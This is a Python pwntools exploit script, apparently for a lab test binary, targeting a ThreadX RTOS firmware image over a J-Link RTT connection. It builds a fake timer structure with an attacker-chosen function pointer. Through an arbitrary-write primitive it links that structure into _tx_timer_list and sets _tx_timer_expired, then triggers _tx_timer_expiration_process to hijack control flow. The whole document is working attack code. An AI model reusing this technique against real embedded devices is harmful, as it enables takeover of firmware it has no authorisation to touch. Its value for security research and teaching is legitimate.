from pwn import *

context.update(arch='thumb')



def generate_command(command: int, request_length: int):
    return struct.pack("b", command) + struct.pack("b", request_length)

def alloc_message(message):
    r.send(generate_command(3,len(message)))
    r.send(message)
    #m = r.recv()
    #print(m)
    m = r.recvuntil(b'\r\n')
    print(m)
    r.recv()
    return int(m.split()[-1].strip(),16)

def print_stored_message(target):
    r.send(generate_command(3,4))
    r.send(p32(target))
    r.recv()

def write_message_somwehere(target, message):
    r.send(generate_command(5,len(message)))
    r.send(p32(target))
    r.send(message)
    r.recv()

r = remote('127.0.0.1', 19021)
r.recvuntil(b'JLinkRTTViewerExe\r\n')


exe = ELF("bin/fop_test.elf", checksec=False)

""""
type = struct TX_TIMER_INTERNAL_STRUCT {
    ULONG tx_timer_internal_remaining_ticks;
    ULONG tx_timer_internal_re_initialize_ticks;
    void (*tx_timer_internal_timeout_function)(ULONG);
    ULONG tx_timer_internal_timeout_param;
    struct TX_TIMER_INTERNAL_STRUCT *tx_timer_internal_active_next;
    struct TX_TIMER_INTERNAL_STRUCT *tx_timer_internal_active_previous;
    struct TX_TIMER_INTERNAL_STRUCT **tx_timer_internal_list_head;
}
sizeof(TX_TIMER_INTERNAL_STRUCT) = 28
"""

target =  0xdeadbeef  # exe.symbols['win_function'] #next(exe.search(b"my-super-secret"))

malicious_struct = p32(0) + p32(0) + p32(target) + p32(0) * 4

#payload = cyclic(100) reusult 0x61616174 76
 
#_tx_timer_expired= 1

#_tx_timer_list=

timer_expired = exe.symbols['_tx_timer_expired']
timer_list =  exe.symbols['_tx_timer_list']
dispatch_gadget = exe.symbols['_tx_timer_expiration_process']

log.info("Creating timer struct")
timer_struct = alloc_message(malicious_struct)
log.info("Time struct created: " + hex(timer_struct))

log.info("Setting _tx_timer_list")
write_message_somwehere(timer_list, p32(timer_struct))

log.info("Setting _tx_timer_expired")
write_message_somwehere(timer_expired,p32(1))

log.info("Executing fop")
payload = p32(dispatch_gadget)
r.send(generate_command(6,len(payload)))
r.send(payload)